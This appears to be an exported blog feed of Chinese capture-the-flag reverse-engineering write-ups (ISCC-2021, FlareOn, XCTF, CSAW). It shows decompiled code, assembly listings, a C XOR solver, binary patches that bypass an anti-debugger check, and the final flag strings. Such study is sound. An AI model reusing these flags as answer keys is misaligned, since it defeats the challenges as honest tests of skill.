class="line"></span><br></pre></td></tr></table></figure><h3 id="first"><a href="#first" class="headerlink" title="first"></a>first</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">public class first &#123;</span><br><span class="line">  public static String firstStr(String paramString) &#123;</span><br><span class="line">    return paramString.replace(&quot;B1&quot;, &quot;dN&quot;).replace(&quot;_&quot;, &quot;8&quot;).replace(&quot;!&quot;, &quot;P&quot;).replace(&quot;rea&quot;, &quot;hwl&quot;).replace(&#39;1&#39;, &#39;u&#39;).replace(&quot;m&quot;, &quot;+&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="second"><a href="#second" class="headerlink" title="second"></a>second</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">import android.util.Base64;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line">public class second &#123;</span><br><span class="line">  public static String secondStr() &#123;</span><br><span class="line">    byte[] arrayOfByte &#x3D; &quot;1234567890123456&quot;.getBytes();</span><br><span class="line">    try &#123;</span><br><span class="line">      byte[] arrayOfByte1 &#x3D; Base64.decode(&quot;9z2ukkD3Ztxhj+t&#x2F;S1x1Eg&#x3D;&#x3D;&quot;, 0);</span><br><span class="line">      SecretKeySpec secretKeySpec &#x3D; new SecretKeySpec();</span><br><span class="line">      this(arrayOfByte, &quot;AES&quot;);</span><br><span class="line">      Cipher cipher &#x3D; Cipher.getInstance(&quot;AES&#x2F;ECB&#x2F;NoPadding&quot;);</span><br><span class="line">      cipher.init(2, secretKeySpec);</span><br><span class="line">      byte[] arrayOfByte2 &#x3D; cipher.doFinal(arrayOfByte1);</span><br><span class="line">      null &#x3D; new String();</span><br><span class="line">      this(arrayOfByte2);</span><br><span class="line">      return null.replace(&quot; &quot;, &quot;&quot;);</span><br><span class="line">    &#125; catch (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="third"><a href="#third" class="headerlink" title="third"></a>third</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">public class third &#123;</span><br><span class="line">  public static boolean thirdStr(String paramString) &#123;</span><br><span class="line">    if (paramString.length() !&#x3D; 8)</span><br><span class="line">      return false; </span><br><span class="line">    char c1 &#x3D; paramString.charAt(0);</span><br><span class="line">    char c2 &#x3D; paramString.charAt(1);</span><br><span class="line">    char c3 &#x3D; paramString.charAt(2);</span><br><span class="line">    char c4 &#x3D; paramString.charAt(3);</span><br><span class="line">    char c5 &#x3D; paramString.charAt(4);</span><br><span class="line">    char c6 &#x3D; paramString.charAt(5);</span><br><span class="line">    char c7 &#x3D; paramString.charAt(6);</span><br><span class="line">    char c8 &#x3D; paramString.charAt(7);</span><br><span class="line">    return (c1 % 8 !&#x3D; 7 || c1 % 9 !&#x3D; 8) ? false : ((c2 - 3 !&#x3D; 100) ? false : (((c3 ^ 0x5D) !&#x3D; 100) ? false : ((c3 * 2 - 10 !&#x3D; c4) ? false : ((c5 + 1 !&#x3D; 120) ? false : (((c6 ^ c7) !&#x3D; 56) ? false : ((c6 - c7 !&#x3D; 24 || c7 - c8 !&#x3D; 4) ? false : (!(c8 !&#x3D; &#39;P&#39;))))))));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一题写脚本还没手算快,AES在线解密即可.</p><blockquote><p>ISCC{m0B1lE_1s_Gg9reaT!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> ISCC-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录4</title>
      <link href="2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/"/>
      <url>2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
      
        <content type="html"><![CDATA[<h1 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[FlareOn4]IgniteMe">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/1.PNG"></p><blockquote><p>进入start函数</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/2.PNG"></p><h2 id="进入sub-4010F0"><a href="#进入sub-4010F0" class="headerlink" title="进入sub_4010F0"></a>进入sub_4010F0</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/3.PNG"></p><p>去掉字符串中的‘\n’和‘\r’，不过最后好像没有用到。</p><h2 id="进入sub-401050"><a href="#进入sub-401050" class="headerlink" title="进入sub_401050"></a>进入sub_401050</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/4.PNG"></p><p>其中v4可以通过看汇编代码得出，也可以通过动态调试得出。<br>sub_401020是读取长度，byte_403078是我们输入的flag。</p><blockquote><p>汇编代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401050+16↓p</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 mov     eax, 80070057h</span><br><span class="line">.text:00401008                 mov     edx, eax</span><br><span class="line">.text:0040100A                 xor     ax, dx</span><br><span class="line">.text:0040100D                 rol     eax, 4</span><br><span class="line">.text:00401010                 shr     ax, 1</span><br><span class="line">.text:00401013                 pop     ebp</span><br><span class="line">.text:00401014                 retn</span><br><span class="line">.text:00401014 sub_401000      endp</span><br><span class="line">&#x2F;&#x2F;sub_401000的汇编代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:00401050 sub_401050      proc near               ; CODE XREF: start+44↓p</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 var_C           &#x3D; dword ptr -0Ch</span><br><span class="line">.text:00401050 var_8           &#x3D; dword ptr -8</span><br><span class="line">.text:00401050 var_1           &#x3D; byte ptr -1</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050                 push    ebp</span><br><span class="line">.text:00401051                 mov     ebp, esp</span><br><span class="line">.text:00401053                 sub     esp, 0Ch</span><br><span class="line">.text:00401056                 push    offset byte_403078</span><br><span class="line">.text:0040105B                 call    sub_401020</span><br><span class="line">.text:00401060                 add     esp, 4</span><br><span class="line">.text:00401063                 mov     [ebp+var_C], eax</span><br><span class="line">.text:00401066                 call    sub_401000</span><br><span class="line">.text:0040106B                 mov     [ebp+var_1], al</span><br><span class="line">.text:0040106E                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:00401071                 sub     eax, 1</span><br><span class="line">.text:00401074                 mov     [ebp+var_8], eax</span><br><span class="line">.text:00401077                 jmp     short loc_401082</span><br><span class="line">.text:00401079 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401079</span><br><span class="line">.text:00401079 loc_401079:                             ; CODE XREF: sub_401050+5D↓j</span><br><span class="line">.text:00401079                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:0040107C                 sub     ecx, 1</span><br><span class="line">.text:0040107F                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401082</span><br><span class="line">.text:00401082 loc_401082:                             ; CODE XREF: sub_401050+27↑j</span><br><span class="line">.text:00401082                 cmp     [ebp+var_8], 0</span><br><span class="line">.text:00401086                 jl      short loc_4010AF</span><br><span class="line">.text:00401088                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040108B                 movsx   eax, byte_403078[edx]</span><br><span class="line">.text:00401092                 movzx   ecx, [ebp+var_1]</span><br><span class="line">.text:00401096                 xor     eax, ecx</span><br><span class="line">.text:00401098                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109B                 mov     byte_403180[edx], al</span><br><span class="line">.text:004010A1                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:004010A4                 mov     cl, byte_403078[eax]</span><br><span class="line">.text:004010AA                 mov     [ebp+var_1], cl</span><br><span class="line">.text:004010AD                 jmp     short loc_401079</span><br><span class="line">&#x2F;&#x2F;sub_401050的部分汇编代码（第一个for循环结束）</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define length(x) sizeof(x) &#x2F; sizeof(x[0])</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int flag[]&#x3D;&#123;13,  38,  73,  69,  42,  23, 120,  68,  43, 108, 93,  94,  69,  18,  47,  23,  43,  68, 111, 110, 86,   9,  95,  69,  71, 115,  38,  10,  13,  19, 23,  72,  66,   1,  64,  77,  12,   2, 105&#125;;</span><br><span class="line">int v4&#x3D;4;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;length(flag)-1;i&gt;&#x3D;0;i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] ^&#x3D;v4;</span><br><span class="line">v4&#x3D;flag[i];</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;length(flag);i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}</p></blockquote><h1 id="o-strings-attached"><a href="#o-strings-attached" class="headerlink" title="o-strings-attached"></a>o-strings-attached</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5080&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/5.PNG"></p><p>在加密函数最后添加断点，直接得到flag。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/6.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/7.PNG"></p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><h1 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h1><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/8.PNG"></p><p>拖入ida中查看程序逻辑</p><h3 id="伪代码窗口"><a href="#伪代码窗口" class="headerlink" title="伪代码窗口"></a>伪代码窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/9.PNG"></p><p>进一步分析可知：</p><ol><li>sub_40102A的返回值为0</li><li>IsDebuggerPresent函数：<br> 如果当前进程运行在调试器的上下文，返回值为非零值。<br> 如果当前进程没有运行在调试器的上下文，返回值是零。</li></ol><p>lpMem是输出的flag，12-15行是输出的那个窗口，sub_401000是对lpMem进行加密的函数。<br>直接运行程序并不会对对lpMem进行加密，需要对程序进行修改.</p><h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/10.PNG"></p><ol><li>将 jnz     short loc_401096 改为 jmp     short loc_401096</li><li>将 int     3 nop</li><li>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</li></ol><blockquote><p>patch后的程序</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/11.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/12.PNG"></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/13.PNG"></p><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>和ida思路相同</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><blockquote><p>将 jnz     short loc_401096 改为 jmp     short loc_401096</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/14.PNG"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><blockquote><p>将 int     3 nop</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/15.PNG"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><blockquote><p>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/16.PNG"></p><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/17.PNG"></p><blockquote><p>flag{reversing_is_not_that_hard!}</p></blockquote><h1 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h1><p><a href="https://buuoj.cn/challenges#[FlareOn6]Overlong">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/19.PNG"></p><p>进入main函数</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/20.PNG"></p><p>第6行是对unk_402008进行一系列运算，变成Text，但unk_402008的长度为0xAF，这个函数只处理了28位，再结合题目名字，我们将28改为0xAF即可。<br>这里直接patch会报错，在16进制界面修改。改好后运行程序。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/21.PNG"></p><blockquote><p>flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录3</title>
      <link href="2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
      <url>2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]Bytecode">题目链接</a><br>这道题是python字节码，参考<a href="https://docs.python.org/zh-cn/3/library/dis.html?highlight=dis">官方文档</a>手动还原.</p><blockquote><p>字节码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_CONST               0 (3)</span><br><span class="line">              3 LOAD_CONST               1 (37)</span><br><span class="line">              6 LOAD_CONST               2 (72)</span><br><span class="line">              9 LOAD_CONST               3 (9)</span><br><span class="line">             12 LOAD_CONST               4 (6)</span><br><span class="line">             15 LOAD_CONST               5 (132)</span><br><span class="line">             18 BUILD_LIST               6</span><br><span class="line">             21 STORE_NAME               0 (en)</span><br><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_CONST               6 (101)</span><br><span class="line">             27 LOAD_CONST               7 (96)</span><br><span class="line">             30 LOAD_CONST               8 (23)</span><br><span class="line">             33 LOAD_CONST               9 (68)</span><br><span class="line">             36 LOAD_CONST              10 (112)</span><br><span class="line">             39 LOAD_CONST              11 (42)</span><br><span class="line">             42 LOAD_CONST              12 (107)</span><br><span class="line">             45 LOAD_CONST              13 (62)</span><br><span class="line">             48 LOAD_CONST               7 (96)</span><br><span class="line">             51 LOAD_CONST              14 (53)</span><br><span class="line">             54 LOAD_CONST              15 (176)</span><br><span class="line">             57 LOAD_CONST              16 (179)</span><br><span class="line">             60 LOAD_CONST              17 (98)</span><br><span class="line">             63 LOAD_CONST              14 (53)</span><br><span class="line">             66 LOAD_CONST              18 (67)</span><br><span class="line">             69 LOAD_CONST              19 (29)</span><br><span class="line">             72 LOAD_CONST              20 (41)</span><br><span class="line">             75 LOAD_CONST              21 (120)</span><br><span class="line">             78 LOAD_CONST              22 (60)</span><br><span class="line">             81 LOAD_CONST              23 (106)</span><br><span class="line">             84 LOAD_CONST              24 (51)</span><br><span class="line">             87 LOAD_CONST               6 (101)</span><br><span class="line">             90 LOAD_CONST              25 (178)</span><br><span class="line">             93 LOAD_CONST              26 (189)</span><br><span class="line">             96 LOAD_CONST               6 (101)</span><br><span class="line">             99 LOAD_CONST              27 (48)</span><br><span class="line">            102 BUILD_LIST              26</span><br><span class="line">            105 STORE_NAME               1 (output)</span><br><span class="line">output&#x3D;[101, 96, 23, 68, 112, 42, 107, 62, 96, 53, 176, 179, 98, 53, 67, 29, 41, 120, 60, 106, 51, 101, 178, 189, 101, 48]</span><br><span class="line"></span><br><span class="line">  7         108 LOAD_CONST              28 (&#39;welcome to GWHT2020&#39;)</span><br><span class="line">            111 PRINT_ITEM          </span><br><span class="line">            112 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">  9         113 LOAD_NAME                2 (raw_input)</span><br><span class="line">            116 LOAD_CONST              29 (&#39;please input your flag:&#39;)</span><br><span class="line">            119 CALL_FUNCTION            1</span><br><span 